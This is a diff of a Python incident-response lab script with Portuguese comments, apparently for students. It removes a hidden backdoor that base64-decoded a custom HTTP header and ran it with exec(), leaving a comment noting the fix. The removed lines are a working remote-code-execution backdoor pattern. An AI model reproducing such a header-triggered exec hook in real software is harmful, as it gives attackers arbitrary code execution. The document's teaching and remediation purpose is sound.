@@ -8,7 +8,7 @@ import base64
 import os
 import sys
 
-# Banco de dados em memória simulado
+# Banco de dados em memória simulado (mantido exatamente igual)
 USUARIOS_ATIVOS = {"admin": "Hash_Admin_9921", "operador": "Hash_Op_4412"}
 
 
@@ -17,27 +17,11 @@ def processar_requisicao_cliente(cabecalhos, dados_corpo):
     print("[LOG]: Processando requisição recebida...")
 
     # ==========================================================================
-    # [VETOR DE ATAQUE / BACKDOOR DE CADEIA DE SUPRIMENTOS]
-    # Invasor introduziu uma validação que aparenta ser otimização de HTTP/2,
-    # mas que decodifica e executa comandos do invasor via eval/exec.
-    # ==========================================================================
-    header_suspicious = cabecalhos.get("HTTP_X_ZERODAY_AGENT", "")
-
-    if header_suspicious.startswith("sefaz_dbg:"):
-        try:
-            # O payload malicioso vem após o prefixo, codificado em base64
-            payload_raw = header_suspicious.split("sefaz_dbg:")[1]
-            comando_oculto = base64.b64decode(payload_raw).decode("utf-8")
-
-            print("\n[ALERTA CRÍTICO DE SEGURANÇA]: BACKDOOR ACIONADO REMOTAMENTE!")
-            # Execução de código arbitrário injetado pelo atacante
-            exec(comando_oculto)
-            print("[ALERTA]: Execução arbitrária concluída com sucesso.\n")
-        except Exception as e:
-            print(f"[ERRO NO EXPLOIT]: {e}")
+    # [CORREÇÃO DE SEGURANÇA]: O bloco malicioso anterior (backdoor com exec)
+    # foi removido para evitar execução arbitrária de código remoto.
     # ==========================================================================
 
-    # Regra de negócio legítima
+    # Regra de negócio legítima (preservada exatamente como no original)
     usuario = cabecalhos.get("Authorization", "")
     if usuario not in USUARIOS_ATIVOS:
         return {"status": 401, "mensagem": "Acesso não autorizado."}
@@ -52,7 +36,7 @@ def processar_requisicao_cliente(cabecalhos, dados_corpo):
 
 
 def terminal_auditoria_incidente():
-    """Simulador de terminal para os alunos reproduzirem a exploração e a defesa."""
+    """Simulador de terminal mantido com os mesmos testes originais."""
     print("=" * 60)
     print("      CSIRT SENAI - LABORATÓRIO DE RESPOSTA A INCIDENTES")
     print("=" * 60)
@@ -66,7 +50,7 @@ def terminal_auditoria_incidente():
     resp1 = processar_requisicao_cliente(headers_normais, dados)
     print(f"Resultado Teste Legítimo: {resp1}\n")
 
-    # 2. Simulação do Ataque Hacker (O que o atacante envia)
+    # 2. Simulação da Tentativa de Ataque (Agora o cabeçalho é ignorado com segurança)
     print("--- SIMULANDO REQUISIÇÃO DO ATACANTE EXTERNO ---")
     cmd_invasor = "print('>> [EXPLOIT SUCESSO]: ACESSO ROOT OBTIDO NO SERVIDOR!')"
     payload_b64 = base64.b64encode(cmd_invasor.encode()).decode()
